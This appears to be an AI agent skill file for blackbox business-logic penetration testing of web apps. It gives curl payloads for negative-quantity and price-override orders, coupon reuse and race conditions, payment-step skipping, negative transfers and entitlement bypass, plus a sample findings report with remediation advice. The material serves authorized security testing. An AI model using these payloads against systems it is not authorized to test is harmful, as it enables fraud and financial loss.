---
name: blackbox-business
description: >-
  Actively test a target web application for business logic vulnerabilities
  using blackbox techniques. Reads pentest/target-map.md, identifies
  transactional and workflow features, tests for price manipulation, negative
  quantity orders, coupon/voucher abuse, workflow bypass (skipping payment steps),
  race conditions on shared resources, and entitlement bypass after downgrade.
  Writes confirmed findings with PoC steps to pentest/businesslogic-results.md.
  Use when asked to find business logic flaws or abuse-of-function bugs in a
  blackbox pentest.
---

# Blackbox Business Logic Vulnerability Testing

You are actively testing a web application for business logic vulnerabilities without source code access. You will probe the application's intended workflows and constraints to find exploitable logic gaps.

**Prerequisite**: Read `pentest/target-map.md` before starting.

---

## Phase 1: Domain Analysis

Read `pentest/target-map.md` and identify business features to test. Look for:

- **E-commerce / marketplace**: `/cart`, `/checkout`, `/order`, `/product`, `/coupon`, `/payment`
- **Subscription/SaaS**: `/subscription`, `/plan`, `/billing`, `/upgrade`, `/downgrade`
- **Financial**: `/transfer`, `/withdraw`, `/wallet`, `/balance`, `/refund`
- **Auction/bidding**: `/bid`, `/auction`, `/offer`
- **Ratings/reviews**: `/review`, `/rating`, `/vote`
- **Referral/rewards**: `/referral`, `/bonus`, `/reward`, `/points`, `/invite`
- **Booking**: `/reserve`, `/book`, `/slot`, `/appointment`

Write your domain summary and test plans to `pentest/businesslogic-threats.md`:

```markdown
# Business Logic Test Plan

## Application Domain
[What does the app do?]

## Features Identified
- [Feature 1 and its endpoints]
- [Feature 2...]

## Test Scenarios
1. [Scenario title and target endpoint]
...
```

---

## Phase 2: Price & Value Manipulation

### Test 1: Negative Quantity
```bash
# Order with negative quantity (may result in credit)
curl -sk -X POST "<TARGET_URL>/api/orders" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"item_id":1,"quantity":-1,"price":9.99}'

# Check if balance increases or if you receive a credit
curl -sk "<TARGET_URL>/api/wallet" \
  -H "Authorization: Bearer <TOKEN>"
```

### Test 2: Price Override in Request Body
```bash
# Send modified price in request (if price is passed from client)
curl -sk -X POST "<TARGET_URL>/api/checkout" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"item_id":1,"quantity":1,"price":0.01}'  # Original price was $99.99

curl -sk -X POST "<TARGET_URL>/api/cart/checkout" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"amount":0.01}'  # Try zero or minimal amount
```

### Test 3: Zero/Negative Price
```bash
curl -sk -X POST "<TARGET_URL>/api/orders" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"item_id":1,"quantity":1,"total":0}'

curl -sk -X POST "<TARGET_URL>/api/orders" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"item_id":1,"quantity":1,"total":-100}'
```

### Test 4: Rating/Score Out of Range
```bash
# Inject values outside the expected range
curl -sk -X POST "<TARGET_URL>/api/reviews" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"product_id":1,"rating":999}'

curl -sk -X POST "<TARGET_URL>/api/reviews" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"product_id":1,"rating":-5}'
```

---

## Phase 3: Coupon & Discount Abuse

### Test 1: Reuse Single-Use Coupon
```bash
# Apply coupon once
curl -sk -X POST "<TARGET_URL>/api/cart/coupon" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"code":"SAVE10"}'

# Checkout with it
curl -sk -X POST "<TARGET_URL>/api/checkout" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"coupon":"SAVE10"}'

# Try to apply and use again on a second order
curl -sk -X POST "<TARGET_URL>/api/checkout" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"coupon":"SAVE10"}'
```

### Test 2: Concurrent Coupon Abuse (Race Condition)
```bash
# Send 10 concurrent requests to redeem the same one-use coupon
for i in $(seq 1 10); do
  curl -sk -X POST "<TARGET_URL>/api/checkout" \
    -H "Authorization: Bearer <TOKEN>" \
    -H "Content-Type: application/json" \
    -d '{"coupon":"ONCE_ONLY","item_id":1}' &
done
wait
```

### Test 3: Expired Coupon
```bash
# Try an expired promo code
curl -sk -X POST "<TARGET_URL>/api/checkout" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"coupon":"EXPIRED2023","item_id":1}'
```

---

## Phase 4: Workflow Bypass

### Test 1: Skip Payment Step
If checkout is multi-step (cart → payment → confirmation):

```bash
# Step 1: Add to cart
curl -sk -X POST "<TARGET_URL>/api/cart" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"item_id":1,"quantity":1}'

# Step 2: Try to jump directly to order completion (skip payment)
curl -sk -X POST "<TARGET_URL>/api/orders/complete" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"cart_id":1}'

# Or try replay a successful order confirmation token from a previous purchase
curl -sk -X POST "<TARGET_URL>/api/orders/confirm" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"confirmation_token":"<PREVIOUS_SUCCESS_TOKEN>"}'
```

### Test 2: Direct Step Access
```bash
# Try to access a later step URL directly without completing earlier steps
curl -sk "<TARGET_URL>/checkout/step3" \
  -H "Authorization: Bearer <TOKEN>"

curl -sk "<TARGET_URL>/payment/confirm" \
  -H "Authorization: Bearer <TOKEN>"
```

---

## Phase 5: Race Conditions

### Test 1: Double-Spend (Concurrent Same Request)
```bash
# Send two simultaneous purchase requests to consume a balance once
TOKEN="<YOUR_TOKEN>"

curl -sk -X POST "<TARGET_URL>/api/purchase" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"item_id":1,"use_credits":true}' &

curl -sk -X POST "<TARGET_URL>/api/purchase" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"item_id":1,"use_credits":true}' &

wait

# Check if credits were deducted once or twice
curl -sk "<TARGET_URL>/api/wallet" \
  -H "Authorization: Bearer $TOKEN"
```

### Test 2: Race on Free Trial Redeem
```bash
for i in $(seq 1 5); do
  curl -sk -X POST "<TARGET_URL>/api/trial/activate" \
    -H "Authorization: Bearer <TOKEN>" &
done
wait
```

---

## Phase 6: Transfer / Balance Logic

### Test 1: Negative Transfer
```bash
# Transfer negative amount (effectively receive money from recipient)
curl -sk -X POST "<TARGET_URL>/api/transfer" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"to_user_id":2,"amount":-100}'

# Check your balance after
curl -sk "<TARGET_URL>/api/wallet" \
  -H "Authorization: Bearer <TOKEN>"
```

### Test 2: Transfer More Than Balance
```bash
# Attempt to overdraft
curl -sk -X POST "<TARGET_URL>/api/transfer" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"to_user_id":2,"amount":9999999}'
```

### Test 3: Self-Transfer
```bash
# Transfer to yourself (may exploit balance-change logic incorrectly)
curl -sk -X POST "<TARGET_URL>/api/transfer" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"to_user_id":<YOUR_OWN_USER_ID>,"amount":100}'
```

---

## Phase 7: Subscription / Entitlement Bypass

```bash
# Sign up for premium
# Downgrade to free plan
curl -sk -X POST "<TARGET_URL>/api/subscription/downgrade" \
  -H "Authorization: Bearer <TOKEN>"

# Immediately try to access premium features
curl -sk "<TARGET_URL>/api/premium/feature" \
  -H "Authorization: Bearer <TOKEN>"
# If cached session still grants premium access → entitlement not re-checked
```

---

## Output Format

Write findings to `pentest/businesslogic-results.md`:

```markdown
# Business Logic Assessment Results

## Executive Summary
- Scenarios tested: [N]
- Exploitable: [N]
- Likely Exploitable: [N]
- Not Exploitable: [N]

## Findings

### [EXPLOITABLE] Negative quantity order results in wallet credit

- **Category**: Quantity & Numeric Limit Violations
- **Endpoint**: `POST /api/orders`
- **Business Rule Violated**: Orders must have positive quantities
- **Impact**: Attacker places orders with quantity=-1 and receives store credits; can drain company finances
- **Evidence**: HTTP 200 returned; wallet balance increased by $9.99 after order with quantity=-1
- **PoC**:
  ```bash
  # Check initial balance
  curl -sk "https://target.com/api/wallet" -H "Authorization: Bearer <TOKEN>"
  # → {"balance": 10.00}

  # Place negative quantity order
  curl -sk -X POST "https://target.com/api/orders" \
    -H "Authorization: Bearer <TOKEN>" \
    -H "Content-Type: application/json" \
    -d '{"item_id":1,"quantity":-1,"price":9.99}'
  # → HTTP 200

  # Check balance again
  curl -sk "https://target.com/api/wallet" -H "Authorization: Bearer <TOKEN>"
  # → {"balance": 19.99}  ← increased by $9.99
  ```
- **Remediation**: Validate all numeric inputs server-side. Reject orders where quantity ≤ 0. Add database CHECK constraint: `quantity > 0`.

### [EXPLOITABLE] Coupon race condition allows multiple usage

- **Category**: Race Conditions & Concurrency Abuse
- **Endpoint**: `POST /api/checkout`
- **Business Rule Violated**: Coupon SAVE20 is single-use
- **Impact**: Unlimited discount application — attacker can apply a one-time coupon to multiple purchases
- **PoC**:
  ```bash
  # Send 10 concurrent checkout requests with the same coupon
  for i in $(seq 1 10); do
    curl -sk -X POST "https://target.com/api/checkout" \
      -H "Authorization: Bearer <TOKEN>" \
      -H "Content-Type: application/json" \
      -d '{"cart_id":1,"coupon":"SAVE20"}' &
  done
  wait
  # Observe: multiple orders show the discount applied
  ```
- **Remediation**: Mark coupon as used within the same database transaction as the order creation. Use SELECT FOR UPDATE (or optimistic locking) on the coupon record to prevent concurrent redemption.
```

After writing results, delete `pentest/businesslogic-threats.md`.

---

## Important Reminders

- Business logic bugs are highly application-specific — understand the domain before testing.
- Negative numbers, zero values, and extreme values (0, -1, 999999999) are your primary weapons.
- Race conditions require concurrent requests (use `&` in bash to parallelize).
- Client-side-only validation = no validation — always send requests directly without going through the browser.
- Test EVERY workflow endpoint for direct access and step-skipping.
- Clean up: delete `pentest/businesslogic-threats.md` after writing results.
